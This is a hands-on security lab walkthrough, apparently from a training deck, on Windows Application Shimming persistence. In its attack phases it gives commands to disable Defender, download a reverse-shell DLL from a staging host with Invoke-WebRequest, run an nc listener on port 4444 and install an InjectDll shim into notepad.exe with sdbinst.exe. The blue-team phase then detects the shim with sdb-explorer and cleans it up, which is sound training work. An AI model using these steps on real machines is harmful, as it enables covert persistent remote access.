![image](https://github.com/user-attachments/assets/placeholder-header)

# SDB-Explorer

# Windows VM

## The objective of this lab is to use Application Shimming (via the native sdbinst.exe utility) to silently inject a malicious DLL into a trusted Windows process, establishing persistent access — and then use sdb-explorer to forensically expose the hidden attack.

---

### Documentation and Scenario:

**What is Application Shimming?**

The Windows Application Compatibility framework — commonly called the **Shim Engine** — is a legitimate Microsoft technology designed to resolve software compatibility issues between older applications and newer versions of Windows. Instead of modifying application code directly, Windows can intercept specific API calls and transparently reroute them through a compatibility layer, or "shim."

Shims are defined inside **Shim Database files (.sdb)**, binary files installed system-wide using the native Windows utility **sdbinst.exe**. Once a shim is installed, it persists across reboots and applies automatically every time a targeted application is launched — silently, in the background, with no user awareness.

If you want to dive a bit deeper, check the [Windows Application Compatibility Documentation](https://docs.microsoft.com/en-us/windows/win32/devnotes/application-compatibility-database).

**Key Concepts:**

- *Shim Database (.sdb)* : A binary file that defines compatibility fixes targeting specific executable names. Once installed, it is stored in a protected system directory and registered in the Windows registry.

- *sdbinst.exe* : A native, Microsoft-signed Windows utility for installing and uninstalling Shim Databases. Because it is a trusted, pre-existing system binary, its execution is rarely flagged by antivirus software.

- *InjectDll Fix* : A powerful shim type that instructs the Windows Application Compatibility Engine to automatically load an arbitrary DLL into a target process's memory at launch time. This is the core mechanism attackers abuse for persistence.

- *sdb-explorer* : A forensic command-line tool capable of parsing and displaying the contents of Shim Database (.sdb) files in human-readable form, exposing hidden fixes, targeted executables, and injected DLL paths.

>[!NOTE]
> Application Shimming is a textbook **"Living off the Land" (LotL)** persistence technique. The attacker uses **sdbinst.exe** — a legitimate, Microsoft-signed binary that already exists on every Windows installation — to deploy their payload. To the operating system, the Windows Event Log, and most endpoint security tools, this action looks completely routine.


---

### **SCENARIO:**

- In this lab, we simulate a targeted persistence attack using two machines on the same subnet. *The Ubuntu VM acts as the attacker's staging server*, while *the Windows VM represents a compromised corporate endpoint*.

- The attacker has already achieved initial access to the Windows machine. Their goal now is to **establish persistent access** that survives reboots and requires no further interaction — even if the original intrusion vector is discovered and closed.

- To accomplish this, the attacker installs a custom **Shim Database (patch.sdb)** that abuses the Windows Application Compatibility framework. This shim silently injects **evil.dll** — a reverse shell payload — into **notepad.exe** every time it is opened by any user on the machine.

- **Why notepad.exe?** It is one of the most frequently opened applications on any Windows machine, is fully trusted by the OS and users alike, and, crucially, no security tool expects it to make network connections.

>[!IMPORTANT]
> You will start on the **Windows VM**, but consider all commands typed into the **Ubuntu Shell** as actions performed by the attacker on their remote staging server. All lab files are located in the **Lab Directory** on each machine.

---

### Phase 1: Setup and Objective

We have access to a compromised *Windows 11* system. Our goal is to plant a persistent backdoor using the Windows Application Compatibility framework.

- First, open Windows PowerShell and navigate to the **Lab Directory**:

```powershell
cd Desktop/Labs/SdbExplorerLab
```

- Examine the Lab Directory. Notice **sdb-explorer.exe** is already here — this is the forensic tool we will use at the very end to investigate the attack we are about to carry out:

```powershell
ls
```

![image](https://github.com/user-attachments/assets/placeholder-phase1-ls)

- Type **"clear"** in the terminal and *resize* it to take up less space.

>[!IMPORTANT]
> Before proceeding, ensure that **Windows Defender Real-Time Protection is disabled** on the Windows VM. The reverse shell payload (evil.dll) will otherwise be detected and quarantined, preventing the lab from functioning. This simulates a real-world scenario where the attacker has already disabled endpoint protection, or is operating in an environment without active AV coverage.

---

### Phase 2: Staging the Attack (Ubuntu)

As the attacker, your tools are already pre-staged on the Ubuntu server. You need to make the payload files available for download and set up your listener to catch the incoming reverse shell.

- Open an **Ubuntu Shell** terminal:

![image](https://github.com/user-attachments/assets/placeholder-phase2-terminal)

>[!IMPORTANT]
> We will use **2 Ubuntu Terminals** throughout this lab. Resize them so they occupy as little screen space as possible.

- *Terminal 1:* Navigate to the **Lab Directory**, note your Ubuntu IP address, and start a Python web server on port 8001 to host your payload files. Minimize this terminal afterwards.

```bash
cd ~/BnB/SdbExplorerLab
ls -lh
ip a
python3 -m http.server 8001
```

![image](https://github.com/user-attachments/assets/placeholder-phase2-webserver)

>[!NOTE]
> Note down your **\<UBUNTU_IP\>** — you will need it multiple times throughout the lab.
>
> The Lab Directory contains three pre-staged files:
> - **evil.dll** — a reverse shell payload pre-compiled to call back to this Ubuntu VM's IP on port 4444.
> - **patch.sdb** — a Shim Database pre-configured to inject `evil.dll` into `notepad.exe` via the `InjectDll` fix.
> - **sdb-explorer.exe** — the forensic analysis tool.
>
> These files were generated during lab setup. If your Ubuntu IP ever changes between sessions, `evil.dll` will need to be regenerated because the callback address is baked into the binary at compile time. This is a key characteristic of this type of payload.

- *Terminal 2:* Open a second Ubuntu Shell, navigate to the Lab Directory, and start a Netcat listener on port **4444**. This is where the reverse shell will connect when notepad.exe is launched on Windows. **Do NOT minimize this terminal.**

```bash
cd ~/BnB/SdbExplorerLab
nc -lvnp 4444
```

![image](https://github.com/user-attachments/assets/placeholder-phase2-nc)

---

### Phase 3: Payload Delivery & Shim Installation (Windows)

Back on the compromised Windows machine. We download the attack tools from our Ubuntu server and silently install the Shim.

- In PowerShell, download all three files from the Ubuntu staging server. **Replace \<UBUNTU_IP\> with your actual Ubuntu IP address.**

```powershell
# Download the malicious DLL to a plausible, user-writable location
Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/evil.dll" -OutFile "C:\Users\Public\evil.dll"

# Download the Shim Database to a temporary folder
Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/patch.sdb" -OutFile "$env:TEMP\patch.sdb"

# Download the forensic tool (used in the Blue Team phase)
Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/sdb-explorer.exe" -OutFile "C:\Users\Public\sdb-explorer.exe"
```

![image](https://github.com/user-attachments/assets/placeholder-phase3-download)

- Now, install the Shim Database using **sdbinst.exe** — a fully legitimate, Microsoft-signed Windows binary. This is the heart of the Living off the Land technique:

```powershell
sdbinst.exe "$env:TEMP\patch.sdb"
```

![image](https://github.com/user-attachments/assets/placeholder-phase3-sdbinst)

You will see a brief confirmation message. Quietly and without any visible indication to the user, the OS has now been instructed to inject `evil.dll` into every future instance of `notepad.exe`.

>[!NOTE]
> **sdbinst.exe requires Administrator privileges.** In a real attack, this means the adversary must have already escalated their privileges before this step — a realistic post-exploitation assumption on a compromised corporate endpoint.

---

### Phase 4: Triggering the Persistence

This is the moment of truth. From the perspective of any regular Windows user, the next action is completely innocent.

- Open a **NEW** PowerShell terminal and launch Notepad:

```powershell
Start-Process notepad.exe
```

![image](https://github.com/user-attachments/assets/placeholder-phase4-notepad)

The Notepad window appears as normal. But underneath the surface, the Windows Application Compatibility Engine read the installed Shim rule, intercepted the process launch, and silently injected **evil.dll** into notepad's memory space. The DLL ran instantly and opened a TCP connection back to the Ubuntu VM on port 4444.

- Switch to your Ubuntu **Terminal 2**. You should see an incoming connection and now have an interactive command shell running inside the notepad.exe process:

```
Connection from <WINDOWS_IP> <PORT> received!
Microsoft Windows [Version 10.0.xxxxx]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

- Run a quick command from the Ubuntu shell to confirm the access:

```bash
whoami
hostname
```

![image](https://github.com/user-attachments/assets/placeholder-phase4-shell)

>[!IMPORTANT]
> Do **NOT** close the Netcat terminal or the Notepad window until the end of the Blue Team detection phase. We will need the active connection and the running process as forensic evidence.

---

### Phase 5: Blue Team Detection

Time to switch perspective. You are now a security analyst who has received an alert about unusual behavior on this endpoint. You do not yet know what the attacker did — but you are about to find out.

Open a **NEW** PowerShell terminal as **Administrator** and start the investigation.

- **Step 1 — Find the Anomalous Network Connection.** Inspect all established TCP connections enriched with the name of the owning process:

```powershell
Get-NetTCPConnection -State Established |
  Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort,
    @{Name="Process"; Expression={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Name}} |
  Sort-Object Process
```

![image](https://github.com/user-attachments/assets/placeholder-phase5-netconn)

Examine the output carefully. You will find a row where **notepad.exe** has an Established connection to an external IP on port **4444**.

**This is the first major red flag.** Notepad is a plain text editor. It has absolutely no legitimate reason to establish network connections of any kind.

- **Step 2 — Identify the Malicious Process.** Take the OwningProcess ID (PID) from the notepad.exe connection and inspect it:

```powershell
Get-Process -Id <PID> | Select-Object Name, Id, Path, StartTime
```

![image](https://github.com/user-attachments/assets/placeholder-phase5-process)

The path confirms this is a genuine `notepad.exe` — not a renamed binary. So the question becomes: why is it making network connections? Something must have been injected into it.

- **Step 3 — Check the AppCompat Registry for Installed Shims.** sdbinst.exe always writes to the registry when it installs a Shim Database. Let's check:

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB"
```

![image](https://github.com/user-attachments/assets/placeholder-phase5-registry)

You will see one or more GUID-based entries referencing installed SDB files. Their presence on a standard user workstation — where no IT-managed compatibility fixes should be applied — is a significant anomaly.

- **Step 4 — Locate the SDB File on Disk.** Shims installed by sdbinst.exe are stored in a protected system folder, renamed with a GUID so they are not easily identifiable:

```powershell
ls C:\Windows\apppatch\Custom\
ls C:\Windows\apppatch\Custom64\
```

![image](https://github.com/user-attachments/assets/placeholder-phase5-disk)

You will find a `.sdb` file with a cryptic GUID-based filename. This is the attacker's `patch.sdb` hiding in plain sight inside a Windows system directory.

- **Step 5 — Expose the Attack with sdb-explorer.** Native Windows tools cannot easily read the binary contents of an SDB file — this is precisely why these files are such effective hiding spots. Point **sdb-explorer.exe** at the file:

```powershell
$sdbFile = (Get-ChildItem C:\Windows\apppatch\Custom\ -Filter "*.sdb" | Select-Object -First 1).FullName
cd C:\Users\Public
.\sdb-explorer.exe $sdbFile
```

![image](https://github.com/user-attachments/assets/placeholder-phase5-sdbexplorer)

The tool parses the binary database and displays its contents in a human-readable format. You will see clearly:

- The **targeted executable**: `notepad.exe`
- The **fix type applied**: `InjectDll`
- The **path of the injected payload**: `C:\Users\Public\evil.dll`

**This is the smoking gun.** A Shim instructing Windows to inject an unsigned DLL from a user-writable folder (`C:\Users\Public`) into a core system application is an unambiguous Indicator of Compromise (IoC).

**Summary of what we found:**
- `notepad.exe` was making outbound TCP connections it should never make
- An illegitimate Shim Database was installed via sdbinst.exe and registered in the system registry
- The SDB file contained an `InjectDll` rule targeting `notepad.exe` with `C:\Users\Public\evil.dll`
- This mechanism ensures the backdoor is re-established every time any user opens Notepad — including after a reboot

---

### Cleanup

You're done! Let's clean up the environment and remove all malicious artifacts.

- **On Ubuntu:** Go to both terminal windows and press **CTRL+C** to terminate the Python server and Netcat listener. Close all Ubuntu terminals.

- **On Windows:** In the Administrator PowerShell, uninstall the Shim Database using the same sdbinst.exe utility:

```powershell
sdbinst.exe -u "$env:TEMP\patch.sdb"
```

- Remove all dropped files:

```powershell
Remove-Item "C:\Users\Public\evil.dll" -Force
Remove-Item "C:\Users\Public\sdb-explorer.exe" -Force
Remove-Item "$env:TEMP\patch.sdb" -Force
```

- Close all terminal windows and close Notepad if it is still open.

- *(Optional)* Delete the SdbExplorerLab folders on both machines to leave no trace.

---

### Conclusion

In this lab, you experienced a complete persistence attack cycle built entirely on a legitimate Windows mechanism. An attacker with admin access can silently install a Shim Database using a Microsoft-signed binary, causing a fully trusted application like Notepad to load and execute a malicious DLL — automatically, on every launch, for every user, across reboots — with no further attacker interaction required. As a Blue Teamer, you learned to identify the subtle signs: a text editor making external network connections, suspicious registry entries under AppCompatFlags, and GUID-named binary files hiding in Windows system folders. And with sdb-explorer, you had the right tool to crack those binary files open and expose exactly what the attacker planted inside.

<br></br>

# Finished?

[Back to Card's Main Page](/Decks/CORE_v3.1/Persistence/Application_Shimming.md)